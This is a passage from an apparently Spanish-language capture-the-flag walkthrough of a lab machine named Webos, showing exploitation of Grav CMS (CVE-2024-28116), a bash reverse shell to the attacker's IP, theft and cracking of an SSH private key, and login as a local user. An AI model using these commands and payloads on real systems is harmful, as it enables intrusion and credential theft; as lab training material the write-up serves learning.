</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>++++++++++[&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++&gt;++++++&gt;++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;---.&gt;.&gt;-.&gt;-----.&gt;.&gt;--.&gt;.&gt;+.&gt;++++.&gt;-----.&gt;-.&gt;+.&gt;++++.&gt;---.&gt;++.....
</span></span></span></code></pre></div><p>Podemos entonces ir a <a href=https://www.dcode.fr/brainfuck-language class=external-link target=_blank rel=noopener>esta p√°gina web</a>, pasar el contenido del archivo y decodificar el mensaje oculto:</p><p><img alt="Webos 2" src=/pentesting/images/Webos_2.png></p><p>Aparentemente estas son credenciales: <code>admin:Perico69*****</code>.</p><p>Recordamos entonces el archivo <code>admin.yml</code> el cual hab√≠amos hallado anteriormente. ¬øSer√° el hash que no hab√≠amos podido crackear anteriormente el mismo que el hash de la password <code>Perico69*****</code>? Para revisar si esta es la password del usuario, de manera local, podemos crear un archivo el cual s√≥lo contenga esta contrase√±a hallada y vemos si corresponde al hash hallado utilizando la herramienta <code>JohnTheRipper</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;Perico69*****&#39; &gt; admin_found_credentials.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ john --wordlist=./admin_found_credentials.txt admin_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>Warning: Only 1 candidate left, minimum 15 needed for performance.
</span></span></span><span class=line><span class=cl><span class=go>Perico69*****    (?)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:00 DONE (2024-09-05 18:28) 10.00g/s 10.00p/s 10.00c/s 10.00C/s Perico69*****
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>y la crackea. Esto quiere decir, b√°sicamente, que la contrase√±a <code>Perico69*****</code> corresponde a la contrase√±a hasheada que hab√≠amos hallado en el archivo <code>admin.yaml</code> para <code>Grav CMS</code>.</p><p>Googleando d√≥nde se encuentra el panel de administraci√≥n para <code>Grav CMS</code> nos lleva a <a href=https://learn.getgrav.org/17/admin-panel/introduction#usage class=external-link target=_blank rel=noopener>su documentaci√≥n oficial</a>. All√≠, ellos dicen que deber√≠amos de visitar la ruta <code>/admin</code>. Por ende, visitando <code>http://10.20.1.128/admin</code> muestra, en efecto, un nuevo panel:</p><p><img alt="Webos 3" src=/pentesting/images/Webos_3.png></p><p>Si ponemos las credenciales <code>admin:Perico69*****</code> funcionan, y estamos dentro del panel:</p><p><img alt="Webos 4" src=/pentesting/images/Webos_4.png></p><p>En la parte m√°s inferior del panel, puedo ver una versi√≥n: <code>Grav v1.7.44</code>:</p><p>![Webos 5][(/images/Webos_5.png)</p><p>Buscando por <code>Grav CMS exploit</code> para esta versi√≥n, nos lleva a una vulnerabilidad catalogada como <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a>. Adem√°s, somos capaces de encontrar <a href=https://github.com/akabe1/Graver class=external-link target=_blank rel=noopener>este repositorio de Github llamado <code>Graver</code></a> el cual provee un exploit. Basados en la documentaci√≥n, podemos correr este exploit usando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> python3 graver.py -t &lt;target_url&gt; -p &lt;target_port&gt;
</span></span></code></pre></div><p>pero este es un exploit que est√° categorizado como <code>authenticated</code>, es decir, debemos de estar autenticados para poder explotar el servicio. Analizando el c√≥digo fuente del script <code>graver.py</code> (el exploit que viene en el repositorio), podemos ver que las l√≠neas 37 y 38 nos piden un usuario y contrase√±a:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>##############################################</span>
</span></span><span class=line><span class=cl><span class=c1># Enter here your Grav CMS editor credentials</span>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;youruser&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;yourpassword&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>##############################################</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>All√≠, cambiamos estas l√≠neas por nuestros valores <code>username = 'admin'</code> y <code>password = 'Perico69*****'</code> (las credenciales halladas).</p><p>Si corremos el exploit, aparentemente √©ste funciona:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 grav_exploit.py -t http://10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>RCE payload injected, now visit the malicious page at: &#39;http://10.20.1.128:80/hacked_P9AI?do=&#39;
</span></span></span></code></pre></div><p>Visitando el sitio web creado por el exploit muestra una simple p√°gina:</p><p><img alt="Webos 6" src=/pentesting/images/Webos_6.png></p><p>donde <code>www-data</code> me dice que se pudo ejecutar el exploit, pero no soy capaz de ejecutar c√≥digo al visitar <code>http://10.20.1.128:80/hacked_P9AI?do=id</code> o algo similar.</p><p>Ya en este punto, decidimos buscar c√≥mo explotar esta vulnerabilidad y encontramos <a href="https://ethicalhacking.uk/videos/CVE-2024-28116/#gsc.tab=0" class=external-link target=_blank rel=noopener>este video</a> donde utilizan exactamente el mismo exploit del repositorio que hemos estado usando y, adem√°s, ense√±an c√≥mo ejecutar c√≥digo. En resumen, una vez la p√°gina ha sido creada, vamos al panel principal y luego a la pesta√±a <code>P√°ginas</code> (<code>Pages</code>) que se encuentra al lado izquierdo. Esto redirige a la ruta <code>/admin/pages</code>. Una vez all√≠, podemos ver las p√°ginas del gestor de contenido; entre ellas la p√°gina web generada por el exploit:</p><p><img alt="Webos 8" src=/pentesting/images/Webos_8.png></p><p>Clickeando en el nombre de nuestra p√°gina creada nos lleva a <code>/admin/pages/&lt;nombre-p√°gina></code>. En nuestro caso, dado que el nombre de la p√°gina es <code>hacked_P9AI</code>, √©ste nos redirigir√° a la ruta <code>/admin/pages/hacked_p9ai</code>. Ahora somos capaces de ver su contenido:</p><p><img alt="Webos 9" src=/pentesting/images/Webos_9.png></p><p>Aqu√≠ entonces decidimos cambiar la cadena/string <code>whoami</code> por <code>ping -c1 10.20.1.110</code>, donde <code>10.20.1.110</code> es la direcci√≥n IP de nuestra m√°quina de atacante.</p><p><img alt="Webos 10" src=/pentesting/images/Webos_10.png></p><p>y clickeamos en el bot√≥n de <code>Guardar</code> (<code>Save</code>) en la parte superior derecha.
B√°sicamente, lo que haremos ser√° tratar de enviarnos un <code>ping</code> a nuestra m√°quina de atacante para corroborar que podemos realizar <code>Remote Code Execution</code> (<code>RCE</code>).</p><p>Utilizamos entonces la herramienta <code>tcpdump</code> para ponernos en escucha por trazas <code>ICMP</code> en la interfaz de net <code>eth0</code> (la interfaz de net por la cual tenemos conectividad a la m√°quina v√≠ctima):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni eth0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span></span></code></pre></div><p>Luego, si visitamos <code>http://10.20.1.128/hacked_p9ai</code> podemos ver que el comando <code>ping</code> ha sido ejecutado:</p><p><img alt="Webos 11" src=/pentesting/images/Webos_11.png></p><p>y revisando nuestro listener con <code>tcpdump</code> vemos que hemos recibido algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni eth0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>19:33:22.826339 IP 10.20.1.128 &gt; 10.20.1.110: ICMP echo request, id 55659, seq 1, length 64
</span></span></span><span class=line><span class=cl><span class=go>19:33:22.826357 IP 10.20.1.110 &gt; 10.20.1.128: ICMP echo reply, id 55659, seq 1, length 64
</span></span></span></code></pre></div><p>Recibimos un <code>ping</code> desde la direcci√≥n <code>10.20.1.128</code>, la cual es la direcci√≥n IP de la m√°quina v√≠ctima. Confirmamos as√≠ que hemos logrado un <code>Remote Code Execution|RCE</code>.</p><p>Dado que esto funcion√≥, volvemos al directorio <code>/admin/pages</code> y volvemos a editar nuestro archivo malicioso. Pero esta vez decidimos agregar el payload:
!<code>Webos_12.png</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.20.1.110/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>donde <code>10.20.1.110</code> es nuestra IP de atacante y <code>443</code> es el puerto en el cual nos pondremos en escucha con <code>netcat</code> para obtener una reverse shell.</p><p>Guardamos el contenido de la p√°gina de nuevo y en una terminal nos ponemos en escucha con <code>netcat</code> en el puerto <code>443</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>Finalmente, visitamos la p√°gina que contiene nuestro payload (en nuestro caso <code>http://10.20.1.128/hacked_p9ai</code>) y obtenemos una reverse shell como el usuario <code>www-data</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.110] from (UNKNOWN) [10.20.1.128] 60254
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (539): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><p>Luego de buscar por archivos interesantes, encontramos un archivo interesante en el directorio <code>/opt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /opt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 webos webos 4096 Jul  6 14:34 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root  root  4096 Jul  6 14:31 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 webos webos 3434 Jul  6 13:56 id_rsa
</span></span></span></code></pre></div><p>donde podemos ver una key <code>id_rsa</code> cuyo propietario es el usuario <code>webos</code>.</p><p>Si leemos su contenido tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ cat /opt/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD4ZP0Iyn
</span></span></span><span class=line><span class=cl><span class=go>wv6EzfObd0USFbAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDKenJrjXC6
</span></span></span><span class=line><span class=cl><span class=go>OCWl5WhP4KDa+B7Rv9GdhlZa91O1noGKfOBLqderInRTRJxvhiuMFbpO4xwjhB4A5QYcp1
</span></span></span><span class=line><span class=cl><span class=go>14PQ6h2b5NLvoKxcLvlGqCBhKM9DtveO144I/Fp/XlDN5yh1roWVx8rfRHp2kFQK122q9D
</span></span></span><span class=line><span class=cl><span class=go>8fycSIHL45H5adPb5qK+QlV9xzCoVR7qhxK4QBbz/Pzrl8bPqMlw3EA8of8wsus1b5WBNs
</span></span></span><span class=line><span class=cl><span class=go>Xv/CqtRT8/OIVZA560b8maqf1dI0RxdUkggBYll0xtcQPoT08rawJbUrIV98OZW+KwJBp5
</span></span></span><span class=line><span class=cl><span class=go>MiSJBDxr6x+TSMJRuAxtf75hQjjIo6+EAItwyYzrva+tAl5y4bzZgMeNv7213CMkW0ljBw
</span></span></span><span class=line><span class=cl><span class=go>B6Kyl+4IDcagT4DOwI0wQGQPFMWSewhDcItbyWq6dYeru5Cbj/SiQ7fhPOpsg78RoZA3tb
</span></span></span><span class=line><span class=cl><span class=go>HbfdGOcC1vXpH3jAL6QR+ByK9HeGtKl8xvrC33Vc7vm+pQdCzllyfjQ4jiNMZKB7EOZT1E
</span></span></span><span class=line><span class=cl><span class=go>a8jZW+XARzuIBxlZzLMDAK5BnBtR7UA+uC4MbkXDwD4WjG6uHyu4RF2guyD3/1T4T8e3Z9
</span></span></span><span class=line><span class=cl><span class=go>ZiYcwntg1stBXc34kc+PVmDpUPtLhJ8TyHca3gDDifRLOyfSThRlo7Hg33wPgUTjjlL2Bg
</span></span></span><span class=line><span class=cl><span class=go>UEW0kyGIIpx7Q9FCk5dK/LKORImoeNVumW2gXcl681LwAAB1DVzVbFv37ynqMpft+cx4eV
</span></span></span><span class=line><span class=cl><span class=go>SvsYBYkIL3kcdy0/PH7LRNOoLVX04Wy2vxzsthB6Nh48SOJlGrFHxeg4VJUXdZ06n9Hk+t
</span></span></span><span class=line><span class=cl><span class=go>3dlLdZyackN2MYnDCdoiowwuSMiwIrOaUhWjz4J8/zYA/EMZXVPVEyiBkP2qb2zNwTqS5W
</span></span></span><span class=line><span class=cl><span class=go>YsxsNPjRFzQ5OpTsc0wGClIMDrMokA9Qc+zQRog5n8N8NBawaKCUKGDqZY4DqtilvBIDfP
</span></span></span><span class=line><span class=cl><span class=go>etDu/cZYxhr97HVt11B5LSZBlR23qyomnbyOUCxBz/QUzQaU3UvfNhKe2PbdYUOHUWcdYR
</span></span></span><span class=line><span class=cl><span class=go>6sheRmoylVU/jA+P63Z9nfC3J+6yHycmQXQgQdUlQTIiDbTJcoAj2QXPcMqIdWDCVjxTx4
</span></span></span><span class=line><span class=cl><span class=go>Wlr4xoI+mhoi+PGvUpoXuDO3JkptUp3SHYKANDEREnbotmjnAvr53GuCDTUvTaXgjln1at
</span></span></span><span class=line><span class=cl><span class=go>jZC1v5+sTu0rd77wydMf1NKgQ8FxkCJxafpfwb/aNCwdPzmHlWIHAZzu8S0CGJGbW4yJxa
</span></span></span><span class=line><span class=cl><span class=go>aBpedaFdxkxZRH2iG56Z8kSPno6DUTp2adIqowIr+6dByv3KK3iXHkBm5zxJBMF4U0Z9ra
</span></span></span><span class=line><span class=cl><span class=go>fH/Sbvwfex+v0cH4TLHP3/xI3op/zzVgCIlEs3uQHysGuuEsFE+ICUQUQ3KgEGaMbMKeAm
</span></span></span><span class=line><span class=cl><span class=go>fNOw5yNg4laRrHrvrmTqfhH9DfnYF0mRmFbj3QO59lgO2HbWDiaribGXT5B1SvCV6j0N1G
</span></span></span><span class=line><span class=cl><span class=go>l3ss7TohQPvHeAbCdU5v8L8B0j+NbltGg7aMZPdMwypgKS4F3Zu0Iun9A6DqicvN7aYDp1
</span></span></span><span class=line><span class=cl><span class=go>PIpbezE1rxgcCgGjGe9TDYQJSWUmU3n8pfANfTn6uwkAWLRSBpQjkSzCwUjgSmR7sfXZ36
</span></span></span><span class=line><span class=cl><span class=go>g0lSh5pYhYOgV9s2OHPQz+sw+NxjgQQdwKg786OnEtyZJopkvNuICM3se13PiZLGQOXuDr
</span></span></span><span class=line><span class=cl><span class=go>NMiw6WjBiB/RtVhgrfXukIPKPf17CD3M81iQn1ZuhLdQajrg2MC36yKK9qlz0Yr70YTIQ4
</span></span></span><span class=line><span class=cl><span class=go>hsYSEjRX5q/9+yMwxTpXkUp2z+gypV9ipOloCmeYNYhroVbj+JJ3xzNytY9QmCAaewFTCv
</span></span></span><span class=line><span class=cl><span class=go>IPcKdNjzU6IKmnNrWoZcHj/UY7BouupdLryKVMCkZ4tgaytMB4NwEO+y4Frz5+eXlASpvM
</span></span></span><span class=line><span class=cl><span class=go>AFfLEevk90n2JmQ7IopBeY0axilX7ylw9xb7pWpi7EkX1Q3IR4k05Je93KiV/76Qmbl2uO
</span></span></span><span class=line><span class=cl><span class=go>4sFA/tX6PLkWHFrlJ5hT/YdT785zR7qFokCWhGdX8/nYilHbHiU60GS2tzV9pxvPjajjqt
</span></span></span><span class=line><span class=cl><span class=go>BXKcaJkYYyCdamN94wU1eRqJfIXWJH2P9wK5NegvkMO0oKLqCmZh9I0OejjzlzvhtTwD2W
</span></span></span><span class=line><span class=cl><span class=go>I91lHp8GLSUVxsLblT1egrJmC+WOZQNrvS13nn+5eCq92sPsuUnsbWdLdbve5QET2jKjqD
</span></span></span><span class=line><span class=cl><span class=go>DKKfnDT5tKBju79rESaOcS64YBilm3lFfeRj12ViZ9Z8T/nkUP0BMj1XgCa+2KgRvP7TtD
</span></span></span><span class=line><span class=cl><span class=go>1DhqYbh8JKEkA/Pmwn+wnCYBwK7WgwTyfkBnvwZZgrNub6UdaCH1EsHw4Ghqy3GKJpNB0r
</span></span></span><span class=line><span class=cl><span class=go>RWvbm1kbvtvVmhW4unTMUy3PEt5e89J8yoFOhZEGFgnzgpeAM0sJL0hlUKFSVHl7hrgL54
</span></span></span><span class=line><span class=cl><span class=go>auYPahPbrjjgbQaNoyoqsaAz3SR0Fr/gB8fTUrqT0EOpF0kQ+0dy7Qc9YE4bXl+LVN06Jh
</span></span></span><span class=line><span class=cl><span class=go>t4J7/NNa4eYhKNowUq/7F3bVIcfPn+4wnf1D50UOTv9RJq595cWig8PCU+cEczDTzxRm51
</span></span></span><span class=line><span class=cl><span class=go>BQkC0AxtHHlI+E6o7ygY5W3eaJo0fieJ9rWYJBKLgZ7sFouOqBescUfM3Nwcxs4JqBzxhw
</span></span></span><span class=line><span class=cl><span class=go>2x8kMlNjlP7BL7BLBe02jS3NzZI1n9pD77MVdWwrSW7fLFEUUa8V6q3pP2nfV994XUB5Fo
</span></span></span><span class=line><span class=cl><span class=go>/dlcrpqxf9oJKpn5V9zDq2AROD/H6ktl17lYeUGnm9MkAghf5Jqh7Qe+RygzFCYdbA+ak2
</span></span></span><span class=line><span class=cl><span class=go>C4SwUz+H3S5K7VBll31jrTdf2qQ9+2Z75Jkq6xfmbV72NN557jdu6/DPgjrFUvkof80Xb5
</span></span></span><span class=line><span class=cl><span class=go>Gigt+S16QeHHXbE4odDbPhZwrzf3GJCb1bsNtTKbYI1Ta4QAHs+9I9AanBwJiiJ1Hudt3p
</span></span></span><span class=line><span class=cl><span class=go>n3myvrrLMmCBURtfbBKaaYdJ8y0Vvl9PWuRQFzNaSZ4HSSYqHDmHrcqpb25aYxF28cxbd+
</span></span></span><span class=line><span class=cl><span class=go>35P8WAVRESkTAlheO9djGPCu/BBTu5ncFFrjL63pomLavvzLRlJOf0jI0A8YqQVnMqRiJl
</span></span></span><span class=line><span class=cl><span class=go>Ty/pnkh0LGDKg2F0i8OrihgWC95zCpPzMOLlaB0P6BbTnCaK54qqewnFAk7O55xdmu2+Q6
</span></span></span><span class=line><span class=cl><span class=go>xmxVsy2XGQLNYELvVpfBjQTwhDQHpmrdGMxA1MCJqOC5gV5osoXQ+qfM3npzkzlwGiNZsp
</span></span></span><span class=line><span class=cl><span class=go>j517hQKVg/HP0c/lQFSTbrBcmXGljqH29IqiP3E9Mhx6vbWw26LB47psxl+UQLcFa26VS5
</span></span></span><span class=line><span class=cl><span class=go>ezFLIVT0OZPkK1bB3I2tLpXi0=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>Decidimos entonces guardar el contenido de esta key en nuestra m√°quina de atacante en un archivo llamado <code>webos_id_rsa</code>, al cual le damos permisos de ejecuci√≥n y la usamos para conectarnos por <code>SSH</code> como el usuario <code>webos</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nvim webos_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod 600 webos_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ssh -i webos_id_rsa webos@10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The authenticity of host &#39;10.20.1.128 (10.20.1.128)&#39; can&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=go>ED25519 key fingerprint is SHA256:w8UgTBmuwG1smfcGc48qBPhvE6qd3suezLv4a6dEt2M.
</span></span></span><span class=line><span class=cl><span class=go>This key is not known by any other names.
</span></span></span><span class=line><span class=cl><span class=go>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=go>Warning: Permanently added &#39;10.20.1.128&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>Enter passphrase for key &#39;webos_id_rsa&#39;:
</span></span></span></code></pre></div><p>Pero el archivo nos pregunta por una passphrase.</p><p>Podemos entonces usar la herramienta <code>ssh2john</code> para extraer el hash de esta passphrase y guardarlo en un archivo que llamaremos <code>webos_passphrase</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh2john webos_id_rsa &gt; webos_passphrase
</span></span></span></code></pre></div><p>Tratamos de crackear esta passphrase utilizando <code>JohnTheRipper</code> (<code>john</code>) a trav√©s de un <code>Brute Force Password Cracking</code> con el diccionario <code>rockyou.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt webos_passphrase
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Cost 2 (iteration count) is 16 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>freestyle        (webos_id_rsa)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:01:45 DONE (2024-09-05 19:55) 0.009493g/s 33.41p/s 33.41c/s 33.41C/s beaver..dracula
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>Encontramos una passphrase para la key: <code>freestyle</code>.</p><p>Podemos entonces tratar de loguearnos por <code>SSH</code> en la m√°quina v√≠ctima, proveyendo la key encontrada con su respectiva passphrase:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i webos_id_rsa webos@10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enter passphrase for key &#39;webos_id_rsa&#39;: freestyle
</span></span></span><span class=line><span class=cl><span class=go>Linux TheHackersLabs-Webos 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Debian GNU/Linux system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span></span><span class=line><span class=cl><span class=go>permitted by applicable law.
</span></span></span><span class=line><span class=cl><span class=go>Last login: Thu Jul 18 11:45:53 2024 from 192.168.18.19
</span></span></span><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$
</span></span></span></code></pre></div><p>Y estamos dentro como el usuario <code>webos</code>.</p><p>Podemos leer el contenido de la flag <code>user.txt</code> en el directorio <code>/home</code> de este usuario.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Ya dentro de la m√°quina v√≠ctima, revisamos archivos en el directorio <code>/home/webos</code>. Hay un archivo que no es para nada usual y cuyo propietario es <code>root</code>, el cual es un ejecutable para <code>Python|python3</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 6716
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 webos webos    4096 jul 18 11:31 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 root  root     4096 jul  6 13:45 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 root  root        9 jul 18 11:31 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos     220 abr 23  2023 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos    3526 abr 23  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 webos webos    4096 jul  6 14:36 .local
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos     807 abr 23  2023 .profile
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root  root  6839928 jul  6 14:10 python3
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 webos webos    4096 jul  6 13:55 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-r-------- 1 webos webos      36 jul 18 11:02 user.txt
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 webos webos    4096 jul 17 20:47 webito
</span></span></span></code></pre></div><p>Revisamos qu√© tipo de archivo es con el comando <code>file</code>. No obstante, el sistema no reconoce el binario ni comando <code>file</code> en el sistema, lo cual es raro y no es muy usual&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ file /home/webos/python3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-bash: file: orden no encontrada
